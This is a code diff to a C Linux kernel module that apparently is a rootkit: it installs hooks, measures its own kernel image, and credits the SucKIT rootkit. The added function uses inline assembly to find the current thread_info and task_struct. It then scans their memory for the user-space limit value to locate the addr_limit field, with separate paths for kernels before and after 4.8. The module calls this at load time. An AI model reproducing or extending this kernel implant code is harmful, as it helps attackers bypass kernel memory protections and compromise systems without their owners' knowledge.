@@ -145,6 +145,7 @@ void uninstall_hooks(void);
 void rseed(long);
 long rand64(void);
 inline int rand32(void);
+mm_segment_t *search_addr_limit(void);
 
 /*
  * Global variables.
@@ -169,6 +170,11 @@ int load(void)
 	void *tmp = NULL;
 	long addr = 0;
 	int ret = 0;
+
+	addr_limit = search_addr_limit();
+	if (addr_limit == NULL) {
+		return 0;
+	}
 
     kernel_len = &kernel_end - &kernel_start;
     kernel_paglen = PAGE_ROUND_UP((unsigned long)&kernel_start + (kernel_len - 1)) - PAGE_ROUND_DOWN(&kernel_start);
@@ -910,4 +916,27 @@ long rand64(void) {
 
 inline int rand32(void) {
 	return (int)rand64();
+}
+
+mm_segment_t *search_addr_limit(void) {
+    char *cts = NULL;
+    char *cti = NULL;
+    off_t i = 0;
+
+    asm("andq\t%%rsp, %0": "=r" (cti) : "0" (~0x3FFFUL)); // Get current thread info (thanks to SucKIT).
+    asm("movq\t%%gs:current_task, %0" : "=r" (cts));      // Get current task_struct.
+    for (; i < 0x4000; i++) {
+        if (*(long *)&cti[i] == 0x7ffffffff000) {
+            // We are in kernel < 4.8.x
+            printk("addr_limit offset %ld\n", i);
+            printk("cti               %p\n", cti);
+            return (mm_segment_t *)(cti + i);
+        } else if (*(long *)&cts[i] == 0x7ffffffff000) {
+            // We are in kernel >= 4.8.x
+            printk("addr_limit offset %ld\n", i);
+            printk("cts               %p\n", cts);
+            return (mm_segment_t *)(cts + i);
+        }
+    }
+    return NULL;
 }
